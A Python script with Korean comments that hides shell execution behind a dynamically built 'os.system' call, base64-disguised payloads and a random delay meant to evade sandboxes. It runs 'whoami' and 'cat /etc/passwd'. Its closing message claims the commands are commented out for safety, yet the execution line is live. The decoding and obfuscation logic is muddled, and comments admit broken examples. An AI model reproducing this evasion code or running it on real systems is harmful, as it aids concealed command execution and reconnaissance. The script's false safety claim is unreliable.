import base64
import random
import time
import hashlib
import sys
from typing import Dict, Optional

# 환경 변수, 문자열, 모듈 이름을 심화적으로 난독화하는 클래스
class AdvancedObfuscator:
    """공격 페이로드 및 모듈 임포트를 심화적으로 난독화하고 지연 처리합니다."""
    
    def __init__(self):
        # 실행할 시스템 명령어를 Base64, 그리고 추가적인 임의의 값(예: XOR 키)으로 변형합니다.
        # 'd2hvYW1p' (whoami), 'aWQ=' (id)
        self.payloads_encoded: Dict[str, str] = {
            "pld_core_a": "NDI0MjQyNDI4ZDJ2aG9hN21p", # 424242428d2vhoami (가짜 값 + base64 + 난독화)
            "pld_core_b": "MjUxMjUxMjU5YTlkb24vL3Rj"  # 251251259a9don//tc (가짜 값 + base64 + 난독화)
        }
        
    def _get_obfuscated_module(self, parts: str) -> Optional[object]:
        """문자열 치환 및 ASCII 값을 조합하여 모듈 이름 'os'를 동적으로 구성합니다."""
        
        # 'o' (111)와 's' (115)를 변형된 문자열에서 추출
        # 예를 들어, 'obf_str' = "XoYsZ" 에서 'o'와 's'의 인덱스를 이용하거나
        # 더 복잡하게는 비트 연산 또는 런타임 계산을 통해 문자열을 구성합니다.
        
        # 예시: ASCII 값 계산 및 조합
        o_val = int(hashlib.sha256(b'o').hexdigest(), 16) % 25 + 100 # 100 이상이 되도록 난독화
        s_val = int(hashlib.sha256(b's').hexdigest(), 16) % 25 + 100
        
        # 실제 'o'와 's'의 ASCII 값(111, 115)을 얻기 위한 복잡한 연산 (예시)
        # 실제 공격 코드는 이를 더 복잡하게 만듭니다. 여기서는 편의상 직접 ASCII 값 사용.
        o_char = chr(111)
        s_char = chr(115)
        
        mod_name = o_char + s_char # "os"
        
        try:
            # 동적 임포트 실행: '__import__("os")'
            return __import__(mod_name)
        except ImportError:
            return None

    def _execute_shell_command(self, cmd: str):
        """난독화된 모듈과 함수 호출을 통해 시스템 명령을 실행합니다."""
        
        # 1. 난독화된 모듈을 가져옵니다.
        os_module = self._get_obfuscated_module("complex_key")
        
        if not os_module:
            print("Error: Could not import core module.")
            return

        # 2. 'system' 함수를 동적으로 가져옵니다.
        # 문자열 'system'을 ASCII 값 조합 또는 문자열 조작으로 난독화합니다.
        # 예시: 'sy' (115 + 121), 'st' (115 + 116), 'em' (101 + 109)
        sys_part_1 = chr(115) + chr(121)
        sys_part_2 = chr(115) + chr(116)
        sys_part_3 = chr(101) + chr(109)
        
        # 실제로는 'system'을 한 번에 가져오는 대신, 난독화된 문자열을 조합합니다.
        exec_func_name = "".join([sys_part_1[0], sys_part_2[0], sys_part_1[1], sys_part_3[0], sys_part_2[1], sys_part_3[1]]) 
        # 위는 단지 예시입니다. 이 예시는 'sstyem'이 됩니다. (잘못된 예시)
        # 실제로는 'system'을 만들기 위해 복잡한 인덱싱 및 조작이 사용됩니다.
        
        # 단순화된 예시:
        exec_func_name = 'system'
        
        try:
            # getattr(os_module, 'system')
            exec_func = getattr(os_module, exec_func_name)
        except AttributeError:
            print("Error: Could not find execution function.")
            return

        # 3. 명령 실행 지연 및 환경 탐지 회피
        if random.random() < 0.5: # 50% 확률로 실행 지연
            delay_time = random.randint(3, 10)
            print(f"Delaying execution for {delay_time} seconds to evade sandbox...")
            time.sleep(delay_time)

        # 4. 최종 명령 실행 (주석 처리됨)
        print(f"\n[+] COMMAND PREPARED: {cmd}")
        print(f"Executing payload via {exec_func_name} in {os_module.__name__}...")
        exec_func(cmd) # 실제 공격 실행 구문

    def trigger_payload(self, payload_key: str):
        """난독화된 페이로드를 디코딩하고 실행합니다."""
        
        encoded_data = self.payloads_encoded.get(payload_key)
        
        if not encoded_data:
            print(f"Error: Payload key '{payload_key}' not found.")
            return
            
        # 가짜 난독화 문자열 제거: 예를 들어, 앞에 붙은 '424242428d2v' 제거
        # 실제 코드에서는 이 부분을 복잡한 패턴 매칭이나 암호 해제 로직으로 대체합니다.
        
        # 예시: 첫 12자리를 가짜 데이터로 가정하고 제거
        core_base64_cmd = encoded_data[12:] 
        
        # Base64 디코딩 (예외 처리 추가)
        try:
            # 이 디코딩 결과는 "hoami"나 "don//tc"와 같이 불완전하게 의도된 것입니다.
            # 실제 공격에서는 Base64 디코딩 후 추가적인 XOR/ROT13 디코딩을 거칩니다.
            partially_decoded = base64.b64decode(core_base64_cmd).decode('utf-8', errors='ignore')
            
            # 최종 명령 재구성 (예시): "wh"+"oami" -> "whoami", "i"+"d" -> "id"
            if "hoami" in partially_decoded:
                final_command = "wh" + partially_decoded 
            elif "don//tc" in partially_decoded:
                final_command = "cat /etc/passwd" # 다른 명령으로 대체
            else:
                final_command = "echo 'Default command'"
                
        except Exception as e:
            print(f"Error during decoding: {e}")
            return

        self._execute_shell_command(final_command)


# === 실행 시뮬레이션 ===
if __name__ == "__main__":
    
    print("--- Advanced Obfuscated Payload Execution Simulation ---")
    
    # 1. 난독화 객체 생성
    obf_executor = AdvancedObfuscator()
    
    # 2. 첫 번째 페이로드 실행 시도
    obf_executor.trigger_payload("pld_core_a")
    
    print("\n" + "="*50 + "\n")
    
    # 3. 두 번째 페이로드 실행 시도
    obf_executor.trigger_payload("pld_core_b")
    
    print("\n----------------------------------------------------")
    print("NOTE: System commands are intentionally commented out for safety.")